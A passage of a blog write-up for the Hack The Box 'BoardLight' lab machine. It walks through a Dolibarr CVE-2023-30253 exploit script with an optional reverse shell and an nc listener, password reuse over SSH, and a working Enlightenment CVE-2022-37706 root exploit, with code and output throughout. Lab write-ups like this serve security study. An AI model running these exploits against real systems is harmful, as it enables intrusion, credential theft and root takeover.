+<span class="giallo-l"><span>    current_datetime</span><span class="z-3"> =</span><span> datetime</span><span class="z-3">.</span><span class="z-2">now</span><span class="z-3">().</span><span class="z-2">strftime</span><span class="z-3">(&quot;</span><span class="z-6">%Y%m</span><span class="z-10">%d</span><span class="z-6">%H%M%S</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    site_name</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3"> =</span><span class="z-7"> f</span><span class="z-6">&quot;</span><span class="z-10">{</span><span>SITE_NAME</span><span class="z-10">}</span><span class="z-6">_</span><span class="z-10">{</span><span>current_datetime</span><span class="z-10">}</span><span class="z-6">&quot;</span></span>
+<span class="giallo-l"><span>    page_name</span><span class="z-3">:</span><span class="z-12"> str</span><span class="z-3"> =</span><span class="z-7"> f</span><span class="z-6">&quot;</span><span class="z-10">{</span><span>PAGE_NAME</span><span class="z-10">}</span><span class="z-6">_</span><span class="z-10">{</span><span>current_datetime</span><span class="z-10">}</span><span class="z-6">&quot;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">    async with</span><span> aiohttp</span><span class="z-3">.</span><span class="z-2">ClientSession</span><span class="z-3">()</span><span class="z-3 z-i"> as</span><span> session</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-1 z-i">        # Get CSRF token</span></span>
+<span class="giallo-l"><span>        csrf_token</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> get_csrf_token</span><span class="z-3">(</span><span class="z-2">session</span><span class="z-3">,</span><span class="z-2"> LOGIN_URL</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        if</span><span> csrf_token</span><span class="z-3"> is None:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">CSRF token not found in the response.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;CSRF token: </span><span class="z-10">{</span><span class="z-2">csrf_token</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">        # Login as admin</span></span>
+<span class="giallo-l"><span>        is_logged_in</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> login</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-2">            session</span><span class="z-3">,</span><span class="z-2"> LOGIN_URL</span><span class="z-3">,</span><span class="z-2"> csrf_token</span><span class="z-3">,</span><span class="z-2"> USERNAME</span><span class="z-3">,</span><span class="z-2"> PASSWORD</span></span>
+<span class="giallo-l"><span class="z-3">        )</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        if</span><span class="z-3"> not</span><span> is_logged_in</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">Login failed.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(&quot;</span><span class="z-6">Login successful.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">        # Get CSRF token</span></span>
+<span class="giallo-l"><span>        csrf_token</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> get_csrf_token</span><span class="z-3">(</span><span class="z-2">session</span><span class="z-3">,</span><span class="z-2"> ADMIN_URL</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        if</span><span> csrf_token</span><span class="z-3"> is None:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">CSRF token not found in the response.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;CSRF token: </span><span class="z-10">{</span><span class="z-2">csrf_token</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">        # Create a website</span></span>
+<span class="giallo-l"><span>        is_website_created</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> create_site</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-2">            session</span><span class="z-3">,</span><span class="z-2"> WEBSITE_API_URL</span><span class="z-3">,</span><span class="z-2"> csrf_token</span><span class="z-3">,</span><span class="z-2"> site_name</span></span>
+<span class="giallo-l"><span class="z-3">        )</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        if</span><span class="z-3"> not</span><span> is_website_created</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">Failed to create website.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(&quot;</span><span class="z-6">Website created successfully.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">        # Create a new page</span></span>
+<span class="giallo-l"><span>        pageid</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span class="z-2"> create_page</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-2">            session</span><span class="z-3">,</span><span class="z-2"> WEBSITE_API_URL</span><span class="z-3">,</span><span class="z-2"> csrf_token</span><span class="z-3">,</span><span class="z-2"> site_name</span><span class="z-3">,</span><span class="z-2"> page_name</span></span>
+<span class="giallo-l"><span class="z-3">        )</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        if</span><span> pageid</span><span class="z-3"> is None:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">Failed to create the exploit page.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Exploit page (</span><span class="z-10">{</span><span class="z-2">pageid</span><span class="z-7">=</span><span class="z-10">}</span><span class="z-6">) created successfully.&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">        # Access the configuration file</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        await</span><span class="z-2"> access_conf_file</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-2">            session</span><span class="z-3">,</span><span class="z-2"> WEBSITE_API_URL</span><span class="z-3">,</span><span class="z-2"> csrf_token</span><span class="z-3">,</span><span class="z-2"> site_name</span><span class="z-3">,</span><span class="z-2"> page_name</span><span class="z-3">,</span><span class="z-2"> pageid</span></span>
+<span class="giallo-l"><span class="z-3">        )</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>        signal</span><span class="z-3"> =</span><span class="z-2"> input</span><span class="z-3">(&quot;</span><span class="z-6">Do you want to create a reverse shell? (y/n): </span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        if</span><span> signal</span><span class="z-3">.</span><span class="z-2">lower</span><span class="z-3">() != &quot;</span><span class="z-6">y</span><span class="z-3">&quot;:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">            return</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">        # Create a reverse shell</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        await</span><span class="z-2"> create_reverse_shell</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-2">            session</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-2">            WEBSITE_API_URL</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-2">            csrf_token</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-2">            site_name</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-2">            page_name</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-2">            pageid</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-2">            lhost</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-2">            lport</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class="z-3">        )</span></span></code></pre>
+<p>If we want to obtain the shell, remember to run the following command and wait for a shell</p>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-12">nc</span><span class="z-6"> -lnvp</span><span class="z-10"> 443</span></span></code></pre>
+<p>Here we go!</p>
+<pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">await</span><span class="z-2"> exploit</span><span class="z-3">(</span><span class="z-2">TARGET_HOST</span><span class="z-3">,</span><span class="z-10"> 443</span><span class="z-3">)</span></span></code></pre>
+<p>Exploit output:</p>
+<pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"><span>CSRF token: 686af698b1845c9c8d86c58e6468ab5f</span></span>
+<span class="giallo-l"><span>Login successful.</span></span>
+<span class="giallo-l"><span>CSRF token: 686af698b1845c9c8d86c58e6468ab5f</span></span>
+<span class="giallo-l"><span>Website created successfully.</span></span>
+<span class="giallo-l"><span>Exploit page (pageid=52) created successfully.</span></span>
+<span class="giallo-l"><span>Exploit page edited successfully.</span></span>
+<span class="giallo-l"><span>Exploit page accessed successfully.</span></span>
+<span class="giallo-l"><span>Username: dolibarrowner</span></span>
+<span class="giallo-l"><span>Password: serverfun2$2023!!</span></span></code></pre><h2 id="shell-as-larissa"><a class="zola-anchor" href="#shell-as-larissa" aria-label="Link to this section">#</a>
+Shell as <code>larissa</code></h2>
+<p>Try the password obtained from the configuration file</p>
+<pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">import</span><span> asyncssh</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">if</span><span class="z-3"> &quot;</span><span class="z-6">larissa</span><span class="z-3">&quot; not in</span><span> credentials</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">No credentials for user &#39;larissa&#39; found.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>username</span><span class="z-3"> = &quot;</span><span class="z-6">larissa</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>password</span><span class="z-3"> =</span><span> credentials</span><span class="z-3">[</span><span>username</span><span class="z-3">]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">async with</span><span> asyncssh</span><span class="z-3">.</span><span class="z-2">connect</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-2">    TARGET_HOST</span><span class="z-3">,</span><span class=" z-i"> username</span><span class="z-3">=</span><span class="z-2">username</span><span class="z-3">,</span><span class=" z-i"> password</span><span class="z-3">=</span><span class="z-2">password</span></span>
+<span class="giallo-l"><span class="z-3">)</span><span class="z-3 z-i"> as</span><span> conn</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Check user</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">id</span><span class="z-3">&quot;,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">,</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Obtain the flag</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">cat user.txt</span><span class="z-3">&quot;,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span> result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3"> is not None:</span></span>
+<span class="giallo-l"><span>        dev_flag</span><span class="z-3"> =</span><span> result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">.</span><span class="z-2">strip</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Dev flag: </span><span class="z-10">{</span><span class="z-2">dev_flag</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span></code></pre>
+<p>Output:</p>
+<pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"><span>uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)</span></span>
+<span class="giallo-l"><span>Dev flag: 8fbd769275e2e813edf71e6521556f2d</span></span></code></pre><h2 id="shell-as-root"><a class="zola-anchor" href="#shell-as-root" aria-label="Link to this section">#</a>
+Shell as <code>root</code></h2>
+<p>Exploit <code>CVE-2022-37706</code> to get <code>root</code> access</p>
+<h3 id="enumerate-vulnerable-targets-under-larissa"><a class="zola-anchor" href="#enumerate-vulnerable-targets-under-larissa" aria-label="Link to this section">#</a>
+Enumerate Vulnerable Targets under <code>larissa</code></h3>
+<pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">import</span><span> asyncssh</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">if</span><span class="z-3"> &quot;</span><span class="z-6">larissa</span><span class="z-3">&quot; not in</span><span> credentials</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">No credentials for user &#39;larissa&#39; found.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>username</span><span class="z-3"> = &quot;</span><span class="z-6">larissa</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>password</span><span class="z-3"> =</span><span> credentials</span><span class="z-3">[</span><span>username</span><span class="z-3">]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">async with</span><span> asyncssh</span><span class="z-3">.</span><span class="z-2">connect</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-2">    TARGET_HOST</span><span class="z-3">,</span><span class=" z-i"> username</span><span class="z-3">=</span><span class="z-2">username</span><span class="z-3">,</span><span class=" z-i"> password</span><span class="z-3">=</span><span class="z-2">password</span></span>
+<span class="giallo-l"><span class="z-3">)</span><span class="z-3 z-i"> as</span><span> conn</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Check user</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">id</span><span class="z-3">&quot;,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">,</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Check privilege</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;echo </span><span class="z-10">{</span><span class="z-2">password</span><span class="z-10">}</span><span class="z-6"> | sudo -S -l&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span> result</span><span class="z-3">.</span><span class="z-9">exit_status</span><span class="z-3"> !=</span><span class="z-10"> 0</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(&quot;</span><span class="z-6">No sudo privileges.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">.</span><span class="z-9">stderr</span><span class="z-3">,</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    else</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">,</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Check binaries with SetUID privileges</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">find / -perm -4000 -type f 2&gt;/dev/null</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span> result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3"> is not None:</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">(&quot;</span><span class="z-6">SetUID binaries found:</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>        suid_binaries</span><span class="z-3"> =</span><span> result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">.</span><span class="z-2">strip</span><span class="z-3">().</span><span class="z-2">splitlines</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        for</span><span> binary</span><span class="z-3 z-i"> in</span><span> suid_binaries</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-2">            print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot; - </span><span class="z-10">{</span><span class="z-2">binary</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-2">        print</span><span class="z-3">()</span></span></code></pre>
+<p>Output:</p>
+<pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"><span>uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)</span></span>
+<span class="giallo-l"><span>No sudo privileges.</span></span>
+<span class="giallo-l"><span>[sudo] password for larissa: Sorry, try again.</span></span>
+<span class="giallo-l"><span>[sudo] password for larissa:</span></span>
+<span class="giallo-l"><span>sudo: no password was provided</span></span>
+<span class="giallo-l"><span>sudo: 1 incorrect password attempt</span></span>
+<span class="giallo-l"><span>SetUID binaries found:</span></span>
+<span class="giallo-l"><span> - /usr/lib/eject/dmcrypt-get-device</span></span>
+<span class="giallo-l"><span> - /usr/lib/xorg/Xorg.wrap</span></span>
+<span class="giallo-l"><span> - /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys</span></span>
+<span class="giallo-l"><span> - /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd</span></span>
+<span class="giallo-l"><span> - /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight</span></span>
+<span class="giallo-l"><span> - /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset</span></span>
+<span class="giallo-l"><span> - /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span></span>
+<span class="giallo-l"><span> - /usr/lib/openssh/ssh-keysign</span></span>
+<span class="giallo-l"><span> - /usr/sbin/pppd</span></span>
+<span class="giallo-l"><span> - /usr/bin/newgrp</span></span>
+<span class="giallo-l"><span> - /usr/bin/mount</span></span>
+<span class="giallo-l"><span> - /usr/bin/sudo</span></span>
+<span class="giallo-l"><span> - /usr/bin/su</span></span>
+<span class="giallo-l"><span> - /usr/bin/chfn</span></span>
+<span class="giallo-l"><span> - /usr/bin/umount</span></span>
+<span class="giallo-l"><span> - /usr/bin/gpasswd</span></span>
+<span class="giallo-l"><span> - /usr/bin/passwd</span></span>
+<span class="giallo-l"><span> - /usr/bin/fusermount</span></span>
+<span class="giallo-l"><span> - /usr/bin/chsh</span></span>
+<span class="giallo-l"><span> - /usr/bin/vmware-user-suid-wrapper</span></span></code></pre><h3 id="exploit-enlightenment"><a class="zola-anchor" href="#exploit-enlightenment" aria-label="Link to this section">#</a>
+Exploit Enlightenment</h3>
+<pre class="giallo z-code" data-lang="python"><code data-lang="python"><span class="giallo-l"><span class="z-3 z-i">import</span><span> asyncssh</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">if</span><span class="z-3"> &quot;</span><span class="z-6">larissa</span><span class="z-3">&quot; not in</span><span> credentials</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">No credentials for user &#39;larissa&#39; found.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>username</span><span class="z-3"> = &quot;</span><span class="z-6">larissa</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span>password</span><span class="z-3"> =</span><span> credentials</span><span class="z-3">[</span><span>username</span><span class="z-3">]</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">async with</span><span> asyncssh</span><span class="z-3">.</span><span class="z-2">connect</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-2">    TARGET_HOST</span><span class="z-3">,</span><span class=" z-i"> username</span><span class="z-3">=</span><span class="z-2">username</span><span class="z-3">,</span><span class=" z-i"> password</span><span class="z-3">=</span><span class="z-2">password</span></span>
+<span class="giallo-l"><span class="z-3">)</span><span class="z-3 z-i"> as</span><span> conn</span><span class="z-3">:</span></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Find the target binary with SetUID</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-3">        &quot;</span><span class="z-6">find / -name enlightenment_sys -perm -4000 2&gt;/dev/null | head -1</span><span class="z-3">&quot;,</span></span>
+<span class="giallo-l"><span class=" z-i">        check</span><span class="z-3">=True,</span></span>
+<span class="giallo-l"><span class="z-3">    )</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span> result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3"> is None:</span></span>
+<span class="giallo-l"><span class="z-3 z-i">        raise</span><span class="z-12"> ValueError</span><span class="z-3">(&quot;</span><span class="z-6">Target binary not found.</span><span class="z-3">&quot;)</span></span>
+<span class="giallo-l"><span>    target_binary</span><span class="z-3"> =</span><span> result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">.</span><span class="z-2">strip</span><span class="z-3">()</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-7">f</span><span class="z-6">&quot;Target binary: </span><span class="z-10">{</span><span class="z-2">target_binary</span><span class="z-10">}</span><span class="z-6">&quot;</span><span class="z-3">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Create necessary directories and files for exploitation</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">mkdir -p /tmp/net</span><span class="z-3">&quot;,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&#39;</span><span class="z-6">mkdir -p &quot;/dev/../tmp/;/tmp/exploit&quot;</span><span class="z-3">&#39;,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"><span class="z-1 z-i">    ## </span><span class="z-3 z-i">NOTE</span><span class="z-1 z-i">: we can run the shell command here as well</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-3">        &#39;</span><span class="z-6">echo &quot;id &amp;&amp; cat /root/root.txt&quot; &gt; /tmp/exploit</span><span class="z-3">&#39;,</span><span class=" z-i"> check</span><span class="z-3">=True</span></span>
+<span class="giallo-l"><span class="z-3">    )</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(&quot;</span><span class="z-6">chmod a+x /tmp/exploit</span><span class="z-3">&quot;,</span><span class=" z-i"> check</span><span class="z-3">=True)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i">    # Here we go!</span></span>
+<span class="giallo-l"><span>    result</span><span class="z-3"> =</span><span class="z-3 z-i"> await</span><span> conn</span><span class="z-3">.</span><span class="z-2">run</span><span class="z-3">(</span></span>
+<span class="giallo-l"><span class="z-7">        f</span><span class="z-6">&#39;</span><span class="z-10">{</span><span class="z-2">target_binary</span><span class="z-10">}</span><span class="z-6"> /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), &quot;/dev/../tmp/;/tmp/exploit&quot; /tmp///net&#39;</span><span class="z-3">,</span></span>
+<span class="giallo-l"><span class=" z-i">        check</span><span class="z-3">=True,</span></span>
+<span class="giallo-l"><span class="z-3">    )</span></span>
+<span class="giallo-l"><span class="z-2">    print</span><span class="z-3">(</span><span class="z-2">result</span><span class="z-3">.</span><span class="z-9">stdout</span><span class="z-3">,</span><span class=" z-i"> end</span><span class="z-3">=&quot;&quot;)</span></span></code></pre>
+<p>Output:</p>
+<pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"><span>Target binary: /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys</span></span>
+<span class="giallo-l"><span>uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)</span></span>
+<span class="giallo-l"><span>42a1a4cedab17d94ded5af0f3774755f</span></span></code></pre><h2 id="references"><a class="zola-anchor" href="#references" aria-label="Link to this section">#</a>
+References</h2>
+<ul>
+<li><a rel="noopener external" target="_blank" href="https://0xdf.gitlab.io/2024/09/28/htb-boardlight.html">HTB: BoardLight | 0xdf hacks stuff</a></li>
+<li><a rel="noopener external" target="_blank" href="https://security.snyk.io/vuln/SNYK-PHP-DOLIBARRDOLIBARR-5660595">Arbitrary Command Injection in dolibarr/dolibarr | CVE-2023-30253 | Snyk</a></li>
+<li><a rel="noopener external" target="_blank" href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253">nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253</a></li>
+<li><a rel="noopener external" target="_blank" href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit">MaherAzzouzi/CVE-2022-37706-LPE-exploit</a></li>
+</ul>
+
+    
+<nav class="site-prev-next" aria-label="More posts"><a href="https://shengtuo.me/blog/ssh-x11-forwarding/">← Older: X11 Forwarding over SSH</a><a href="https://shengtuo.me/blog/htb/editor/">Newer: Editor →</a>
+</nav>
+
+  </article>
+</main>
+
+  <footer class="f-footer"><div class="f-footer__cats" aria-hidden="true"></div>
+  <ul class="f-social site-footer-social" aria-label="Elsewhere">
+    <li><a class="f-social__link" href="https://github.com/h1994st" rel="me noopener"><span class="f-icon f-icon--github" aria-hidden="true"></span><span class="f-visually-hidden">GitHub</span></a></li>
+    <li><a class="f-social__link" href="https://scholar.google.com/citations?user=VOefXMMAAAAJ" rel="me noopener"><span class="f-icon f-icon--google-scholar" aria-hidden="true"></span><span class="f-visually-hidden">Google Scholar</span></a></li>
+    <li><a class="f-social__link" href="https://www.linkedin.com/in/shengtuo/" rel="me noopener"><span class="f-icon f-icon--linkedin" aria-hidden="true"></span><span class="f-visually-hidden">LinkedIn</span></a></li>
+    <li><a class="f-social__link" href="https://x.com/ShengtuoHu" rel="me noopener"><span class="f-icon f-icon--x" aria-hidden="true"></span><span class="f-visually-hidden">X</span></a></li>
+    <li><a class="f-social__link" href="https://www.instagram.com/hst_nullderef/" rel="me noopener"><span class="f-icon f-icon--instagram" aria-hidden="true"></span><span class="f-visually-hidden">Instagram</span></a></li>
+  </ul>
+  <p class="site-footer-links"><a href="https://shengtuo.me/blog/">Blog</a> · <a href="https://shengtuo.me/notebook/">Notebook</a> · <a href="https://shengtuo.me/misc/">Misc.</a> · 
+    <a href="https://shengtuo.me/atom.xml">Feed</a>
+  </p>
+  <p>© 2026 Shengtuo Hu</p>
+</footer>
+
+  <dialog class="f-sheet" id="site-search" aria-label="Search" data-index="https://shengtuo.me/search_index.en.json">
+  <div class="f-sheet__panel">
+    <input class="f-input f-search" type="search" placeholder="Search posts and notes" aria-label="Search" autocomplete="off" />
+    <p class="f-meta site-search-status" role="status"></p>
+    <ol class="site-search-results"></ol>
+  </div>
+</dialog>
+<script type="module" src="https://shengtuo.me/js/site/search.js"></script>
+
+  
+  <script type="module" src="https://shengtuo.me/vendor/facet/dist/js/facet.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/cats.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/code-copy.js"></script><script type="module" src="https://shengtuo.me/js/site/share.js"></script>
+
+</body>
+</html>
